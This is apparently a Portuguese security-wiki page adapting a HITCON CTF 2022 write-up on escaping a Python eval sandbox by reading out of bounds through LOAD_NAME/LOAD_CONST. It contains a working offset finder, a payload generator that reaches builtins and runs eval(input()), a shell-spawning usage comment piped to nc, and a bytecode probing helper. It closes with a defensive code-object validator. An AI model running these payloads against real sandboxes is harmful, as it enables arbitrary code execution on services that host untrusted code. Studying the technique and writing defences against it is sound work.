# Leitura OOB do opcode LOAD_NAME / LOAD_CONST

Esta página adapta o writeup original e a exploit chain de Splitline para o HITCON CTF 2022 "V O I D".<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Um operando `LOAD_NAME` ou `LOAD_CONST` pode ler fora de uma tupla `co_names` ou `co_consts` encurtada deliberadamente. Neste challenge, nomes dummy inacessíveis são usados até que uma entrada próxima contenha um atributo útil, como `__getattribute__`.<sup>[[1]](#references)</sup>

O payload restante reutiliza esse nome recuperado para construir um sandbox escape.<sup>[[1]](#references)</sup>

### Visão geral <a href="#overview-1" id="overview-1"></a>

O wrapper do challenge é curto e compila uma expressão antes de avaliá-la:<sup>[[1]](#references)</sup>
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))
```
The input é compilado em um objeto de código Python; em seguida, o wrapper substitui `co_consts` e `co_names` por tuplas vazias antes de chamar `eval`.<sup>[[1]](#references)[[5]](#references)</sup>

Qualquer instrução gerada que ainda indexe uma dessas tabelas pode causar um segfault no interpretador ou expor um ponteiro de objeto adjacente, dependendo do build.<sup>[[1]](#references)</sup>

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Como ocorre o segfault?

Para uma expressão de lista como `[a, b, c]`, o compiler emite instruções `LOAD_NAME` com operandos consecutivos:<sup>[[1]](#references)[[2]](#references)</sup>
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE
```
Se `co_names` for substituído por `()`, o bytecode ainda contém `LOAD_NAME 2`; portanto, um acesso não verificado à tupla pode buscar um ponteiro fora da tupla em vez de gerar `IndexError`.<sup>[[1]](#references)[[3]](#references)</sup>

`LOAD_NAME` e `LOAD_CONST` são as primitivas centrais aqui: seus operandos inteiros selecionam entradas em `co_names` e `co_consts`, respectivamente.<sup>[[1]](#references)[[2]](#references)</sup>

No dispatch do CPython, `LOAD_CONST` recupera a entrada selecionada da tupla e a coloca na pilha; builds de release usam um acessor de tupla não verificado:<sup>[[3]](#references)</sup>
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}
```
Sondeie operandos `LOAD_NAME` crescentes no interpreter de destino para mapear entradas úteis. Splitline observou offsets úteis acima de 700 no ambiente do challenge, mas o layout depende do build; um debugger pode ajudar a inspecionar a memória ao redor.<sup>[[1]](#references)</sup>

### Gerando o Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Quando um offset produzir um nome útil, coloque a consulta fora dos limites em uma expressão inalcançável e referencie o mesmo slot de `co_names` a partir de um acesso a atributo alcançável.<sup>[[1]](#references)</sup>

Por exemplo, se o offset 5 produzir `__getattribute__`, mantenha esse nome no slot 5 enquanto o false branch executa a consulta útil:<sup>[[1]](#references)</sup>
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]
```
> O texto recuperado não precisa ser `__getattribute__`; qualquer identificador que sirva ao payload pode ocupar o slot.<sup>[[1]](#references)</sup>

O compilador reutiliza um slot de `co_names` para ocorrências repetidas de um mesmo nome, como ilustra a disassembly:<sup>[[1]](#references)[[2]](#references)</sup>
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE
```
Because `LOAD_ATTR` também resolve seu nome por meio de `co_names`, o branch alcançável pode reutilizar esse slot; operandos empacotados em versões mais recentes do CPython são descritos nas notas de versão abaixo.<sup>[[1]](#references)[[2]](#references)</sup>

Pequenos inteiros não negativos podem ser sintetizados a partir de expressões booleanas sem constantes:<sup>[[1]](#references)</sup>

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

O exploit original usava nomes em vez de constantes para permanecer dentro do limite de tamanho do challenge.<sup>[[1]](#references)</sup>

Este helper verifica offsets de nomes candidatos construindo um objeto de código com uma tupla `co_names` vazia.<sup>[[1]](#references)</sup>
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done
```
O gerador abaixo mapeia os offsets recuperados para nomes e emite o payload no nível do código-fonte.<sup>[[1]](#references)</sup>
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Em alto nível, o payload gerado obtém os `globals` de uma função, recupera `builtins` e chama `eval(input())`.<sup>[[1]](#references)</sup>
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Notas de versão e opcodes afetados (Python 3.11–3.13)

- No CPython 3.11–3.13, as instruções ainda usam operandos inteiros para indexar as tabelas de constantes e nomes do objeto de código. Se qualquer uma das tuplas for menor que um índice referenciado, um acesso não verificado pode ler um ponteiro de objeto adjacente e causar um crash ou operar sobre ele; o comportamento exato depende do build do interpretador.<sup>[[2]](#references)[[3]](#references)</sup>
- `LOAD_CONST consti` e (3.12+) `RETURN_CONST consti` leem `co_consts[consti]`.<sup>[[2]](#references)</sup>
- Os usuários diretos da tabela de nomes incluem `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR` e (3.12+) `LOAD_FROM_DICT_OR_GLOBALS`.<sup>[[2]](#references)</sup>
- `LOAD_GLOBAL namei` e `LOAD_ATTR namei` usam `co_names[namei >> 1]`; o bit menos significativo controla o comportamento documentado de NULL/method. (3.12+) `LOAD_SUPER_ATTR namei` usa `co_names[namei >> 2]` e armazena duas flags em seus bits menos significativos.<sup>[[2]](#references)</sup>
- O Python 3.11+ introduziu caches adaptativos/inline que adicionam entradas `CACHE` ocultas entre as instruções. Bytecode criado manualmente deve levar essas entradas em conta ao construir `co_code`.<sup>[[2]](#references)</sup>

Implicação prática: o layout do bytecode e os offsets recuperados são específicos da versão e do build. Teste a técnica e qualquer payload gerado na versão-alvo do CPython antes de depender dela.<sup>[[2]](#references)</sup>

### Scanner rápido para índices OOB úteis (compatível com 3.11+/3.12+)

Se preferir sondar objetos interessantes diretamente a partir do bytecode, em vez de usar source de alto nível, você pode gerar objetos de código mínimos e fazer brute-force dos índices. O helper abaixo insere caches inline de acordo com os metadados `dis` do interpretador-alvo.<sup>[[2]](#references)</sup>
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notas
- Para sondar names, substitua `LOAD_CONST` por `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` e ajuste o uso da stack e o operando empacotado para o opcode alvo.<sup>[[2]](#references)</sup>
- Use `EXTENDED_ARG` ou múltiplos bytes de `arg` para alcançar índices >255, se necessário. Este helper emite apenas o byte inferior do operando, portanto índices maiores exigem a construção de bytes brutos ou múltiplos loads.<sup>[[2]](#references)</sup>

### Padrão mínimo de RCE apenas com bytecode (co_consts OOB → builtins → eval/input)

Depois de identificar um índice de `co_consts` que resolve para o módulo builtins, você pode reconstruir `eval(input())` sem `co_names`, manipulando a stack. O material oficial do B01lers CTF 2024 `awpcode` documenta este mesmo padrão de OOB-read.<sup>[[4]](#references)</sup>
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Essa abordagem apenas com a stack é útil quando um desafio fornece controle direto sobre `co_code` enquanto força `co_consts=()` e `co_names=()`; ela evita técnicas no nível do código-fonte e pode manter os payloads pequenos usando operações de stack de bytecode e construtores de tuplas.<sup>[[4]](#references)</sup>

### Verificações defensivas e mitigações para sandboxes

Se você estiver escrevendo um sandbox Python que compila ou avalia código não confiável, não dependa do CPython para verificar os limites dos índices de tuplas usados pelo bytecode. Valide os objetos de código antes de executá-los.<sup>[[2]](#references)[[3]](#references)</sup>

Validador prático (rejeita acesso OOB a co_consts/co_names).<sup>[[2]](#references)</sup>
```python
import dis

def max_name_index(code):
max_idx = -1
direct_name_ops = {
"LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
"IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
"LOAD_FROM_DICT_OR_GLOBALS",
}
for ins in dis.get_instructions(code):
if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
namei >>= 1
elif ins.opname == "LOAD_SUPER_ATTR":
namei >>= 2
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Additional mitigation ideas
- Não permita `CodeType.replace(...)` arbitrário em input não confiável ou adicione verificações estruturais rigorosas ao code object resultante.
- Considere executar código não confiável em um processo separado com sandboxing no nível do sistema operacional (seccomp, job objects, containers), em vez de depender da semântica do CPython.

## References

- [1] [writeup de Splitline no HITCON CTF 2022, "V O I D" (origem desta técnica e exploit chain de alto nível)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [documentação do `dis` do Python 3.13 (índices de bytecode, operandos de nome empacotados e inline caches)](https://docs.python.org/3.13/library/dis.html)
- [3] [macros de acesso a tuplas do CPython 3.13.5 (`GETITEM`)](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
- [4] [writeup do challenge `awpcode` do B01lers CTF 2024 (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
- [5] [Python C API: Code Objects](https://docs.python.org/3/c-api/code.html)
{{#include ../../../banners/hacktricks-training.md}}
